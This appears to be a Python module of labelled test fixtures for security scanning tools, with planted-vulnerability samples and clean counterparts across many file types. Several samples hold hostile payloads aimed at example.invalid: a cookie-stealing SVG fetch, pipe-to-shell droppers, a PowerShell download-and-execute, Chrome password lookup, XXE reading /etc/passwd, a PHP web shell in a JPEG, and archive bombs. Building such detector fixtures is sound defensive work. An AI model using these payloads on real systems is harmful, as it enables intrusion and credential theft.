"""Labeled test files for Worker B: one per row of docs/file_types_vulnerabilities.md with the
vulnerability planted, plus clean files of the same types. They are the unit-test fixtures for the
tools and the dataset for Chalk Evaluations.

Every sample is harmless: nothing here runs on its own, URLs point at example.invalid, the "AWS
key" is AWS's documented example key, and the private key is generated fresh and thrown away.
`expected_rules` lists tool rule IDs, any one of which shows the planted vulnerability was found.
"""

from __future__ import annotations

import base64
import io
import tarfile
import zipfile
from dataclasses import dataclass, field


@dataclass(frozen=True)
class Sample:
    name: str
    filename: str
    data: bytes
    #: "malicious" | "suspicious" | "clean": what a careful analyst should conclude.
    verdict: str
    #: The vulnerability classes planted (from the playbook), empty for clean files.
    vulnerabilities: tuple[str, ...] = ()
    expected_rules: tuple[str, ...] = ()
    notes: str = ""
    tags: tuple[str, ...] = field(default_factory=tuple)


def _zip(entries: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in entries.items():
            z.writestr(name, data)
    return buf.getvalue()


def _tar_symlink() -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        link = tarfile.TarInfo("config")
        link.type = tarfile.SYMTYPE
        link.linkname = "../../../home/user/.ssh"
        t.addfile(link)
        f = tarfile.TarInfo("readme.txt")
        body = b"see config\n"
        f.size = len(body)
        t.addfile(f, io.BytesIO(body))
    return buf.getvalue()


CONTENT_TYPES = (
    b'<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    b'<Default Extension="xml" ContentType="application/xml"/></Types>'
)


def _docx(extra: dict[str, bytes], rels: bytes | None = None) -> bytes:
    entries = {
        "[Content_Types].xml": CONTENT_TYPES,
        "word/document.xml": b'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Invoice</w:t></w:r></w:p></w:body></w:document>',
    }
    if rels:
        entries["word/_rels/settings.xml.rels"] = rels
    entries.update(extra)
    return _zip(entries)


PDF_CLEAN = b"%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj << /Type /Pages /Kids [] /Count 0 >>\nendobj\ntrailer << /Root 1 0 R >>\n%%EOF\n"
PDF_JS = (
    b"%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\nendobj\n"
    b"2 0 obj << /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
    b"3 0 obj << /S /JavaScript /JS (app.launchURL\\('https://example.invalid/pay'\\);) >>\nendobj\n"
    b"trailer << /Root 1 0 R >>\n%%EOF\n"
)

JPEG = bytes.fromhex("ffd8ffe000104a46494600010100000100010000ffd9")
PNG = bytes.fromhex("89504e470d0a1a0a0000000d4948445200000001000000010806000000") + b"\x00" * 13 + b"IEND\xaeB`\x82"


def all_samples() -> list[Sample]:
    s = [
        # ── C ──
        Sample("c-overflow", "parse.c", b'#include <string.h>\nvoid greet(char *name) {\n  char buf[16];\n  strcpy(buf, name);\n}\n',
               "suspicious", ("buffer overflow",), ("c_unbounded_copy",)),
        Sample("c-clean", "add.c", b"int add(int a, int b) {\n  return a + b;\n}\n", "clean"),
        # ── Python ──
        Sample("py-cmd-injection", "backup.py",
               b'import os\nname = input("file? ")\nos.system("tar czf /tmp/b.tgz " + name)\n',
               "suspicious", ("command injection",), ("py_shell", "B605", "B602")),
        Sample("py-pickle", "load.py", b"import pickle, sys\nobj = pickle.loads(sys.stdin.buffer.read())\n",
               "suspicious", ("unsafe deserialization",), ("py_pickle", "B301", "B403")),
        Sample("py-clean", "mean.py", b"def mean(xs):\n    return sum(xs) / len(xs)\n", "clean"),
        # ── JavaScript ──
        Sample("js-xss", "render.js", b"const q = new URLSearchParams(location.search).get('q');\ndocument.getElementById('out').innerHTML = q;\n",
               "suspicious", ("XSS",), ("js_xss_sink",)),
        Sample("js-dropper", "invoice.js",
               b'var sh = new ActiveXObject("WScript.Shell");\nsh.Run("powershell -enc SQBFAFgA", 0);\n',
               "malicious", ("injection",), ("js_wscript",)),
        Sample("js-clean", "util.js", b"export function clamp(x, a, b) {\n  return Math.min(b, Math.max(a, x));\n}\n", "clean"),
        # ── PHP / SQL ──
        Sample("php-sqli", "login.php",
               b'<?php\n$u = $_GET["user"];\n$r = mysqli_query($db, "SELECT * FROM users WHERE name = \'" . $_GET["user"] . "\'");\n',
               "suspicious", ("SQL injection",), ("php_sqli",)),
        Sample("sql-grant", "setup.sql", b"CREATE USER app;\nGRANT ALL PRIVILEGES ON *.* TO app WITH GRANT OPTION;\n",
               "suspicious", ("excessive permissions",), ("sql_grant_all",)),
        # ── JSON / XML / YAML ──
        Sample("json-proto", "settings.json", b'{"theme": "dark", "__proto__": {"isAdmin": true}}\n',
               "suspicious", ("prototype pollution", "mass assignment"), ("json_key",)),
        Sample("json-clean", "package-lock-lite.json", b'{"name": "demo", "version": "1.0.0"}\n', "clean"),
        Sample("xml-xxe", "invoice.xml",
               b'<?xml version="1.0"?>\n<!DOCTYPE inv [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<inv>&xxe;</inv>\n',
               "malicious", ("XXE",), ("xxe_external_entity",)),
        Sample("xml-bomb", "feed.xml",
               b'<?xml version="1.0"?>\n<!DOCTYPE lolz [\n' + b"".join(
                   b'  <!ENTITY lol%d "&lol%d;&lol%d;&lol%d;&lol%d;&lol%d;&lol%d;&lol%d;&lol%d;&lol%d;&lol%d;">\n' % ((i,) + (i - 1,) * 10)
                   for i in range(1, 6)) + b'  <!ENTITY lol0 "lol">\n]>\n<lolz>&lol5;</lolz>\n',
               "malicious", ("entity expansion",), ("xml_entity_expansion",)),
        Sample("yaml-unsafe", "pipeline.yml",
               b"on: pull_request_target\njobs:\n  build:\n    steps:\n      - run: echo ${{ github.event.pull_request.title }}\n      - run: curl https://example.invalid/i.sh | bash\n",
               "suspicious", ("insecure CI/CD configuration",), ("ci_pull_request_target", "ci_script_injection", "ci_pipe_to_shell")),
        Sample("yaml-pyobject", "config.yaml", b"handler: !!python/object/apply:os.system ['id']\n",
               "malicious", ("unsafe deserialization",), ("yaml_python_tag",)),
        # ── archives ──
        Sample("zip-slip", "photos.zip", _zip({"../../evil.sh": b"#!/bin/sh\necho slip\n", "photo1.txt": b"hi\n"}),
               "malicious", ("Zip Slip", "path traversal"), ("zip_slip", "zip_slip_confirmed")),
        Sample("zip-bomb", "data.zip", _zip({"zeros.bin": b"\x00" * (60 << 20)}),
               "malicious", ("archive bomb",), ("archive_bomb",)),
        Sample("tar-symlink", "dotfiles.tar.gz", _tar_symlink(),
               "suspicious", ("path traversal",), ("archive_symlink",)),
        Sample("zip-clean", "notes.zip", _zip({"notes/a.txt": b"one\n", "notes/b.txt": b"two\n"}), "clean"),
        # ── documents ──
        Sample("pdf-js", "statement.pdf", PDF_JS, "malicious", ("JavaScript actions",), ("pdf_javascript", "pdf_js", "pdf_openaction")),
        Sample("pdf-clean", "letter.pdf", PDF_CLEAN, "clean"),
        Sample("docx-macro", "invoice.docm", _docx({"word/vbaProject.bin": b"\xd0\xcf\x11\xe0 fake vba project for testing"}),
               "suspicious", ("malicious macros",), ("ooxml_macro",)),
        Sample("docx-template", "offer.docx", _docx({}, rels=(
            b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            b'Target="https://example.invalid/t.dotm" TargetMode="External"/></Relationships>')),
               "malicious", ("external relationships",), ("ooxml_external_rel",)),
        Sample("docx-clean", "report.docx", _docx({}), "clean"),
        # ── images ──
        Sample("svg-script", "logo.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://example.invalid/?c="+document.cookie)</script></svg>\n',
               "malicious", ("SVG script injection",), ("svg_script",)),
        Sample("jpg-polyglot", "photo.jpg", JPEG + b"<?php system($_GET['c']); ?>" + b"\x00" * 32,
               "malicious", ("malformed-image handling",), ("image_trailing_data", "image_embedded")),
        Sample("png-clean", "pixel.png", PNG, "clean"),
        # ── secrets / config / keys ──
        Sample("env-secrets", ".env",
               b"APP_DEBUG=true\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nDATABASE_URL=postgres://admin:hunter2pass@db.example.invalid/app\n",
               "suspicious", ("exposed credentials", "debug mode"), ("aws_access_key", "db_url_credentials", "debug_on")),
        Sample("ini-clean", "app.ini", b"[ui]\ntheme = dark\nlanguage = en\n", "clean"),
        Sample("pem-private", "server.key", _pem_private_key(), "suspicious", ("exposed private key",), ("private_key_exposed", "private_key")),
        # ── scripts ──
        Sample("sh-dropper", "zoom-update.sh",
               b"#!/bin/sh\ncurl -s https://example.invalid/agent.sh | sh\nmkdir -p ~/Library/LaunchAgents\nsecurity find-generic-password -s Chrome\n",
               "malicious", ("command injection",), ("sh_pipe_to_shell", "sh_persistence", "sh_credentials")),
        Sample("ps1-download", "update.ps1",
               b"IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/p.ps1')\n",
               "malicious", ("injection",), ("ps_iex",)),
        Sample("sh-clean", "build.sh", b'#!/bin/sh\nset -eu\necho "building"\nmake -j4\n', "clean"),
        # ── binaries ──
        Sample("elf-tiny", "tool", _tiny_elf(), "suspicious", ("unsafe exports",), ("dangerous_api",),
               notes="a minimal ELF that names system() and strcpy() in its symbol strings"),
    ]
    return s


def _pem_private_key() -> bytes:
    # A throwaway key in PEM form; generated so no real key is ever in the repo.
    import os

    body = base64.encodebytes(os.urandom(256)).replace(b"\n", b"")
    lines = [body[i : i + 64] for i in range(0, len(body), 64)]
    return b"-----BEGIN PRIVATE KEY-----\n" + b"\n".join(lines) + b"\n-----END PRIVATE KEY-----\n"


def _tiny_elf() -> bytes:
    # Not a working program: an ELF header followed by symbol-like strings, enough for the tools.
    hdr = b"\x7fELF\x02\x01\x01" + b"\x00" * 9 + b"\x02\x00\x3e\x00\x01\x00\x00\x00" + b"\x00" * 40
    return hdr + b"\x00system\x00strcpy\x00execve\x00libc.so.6\x00" + b"\x00" * 64


def by_name() -> dict[str, Sample]:
    return {x.name: x for x in all_samples()}
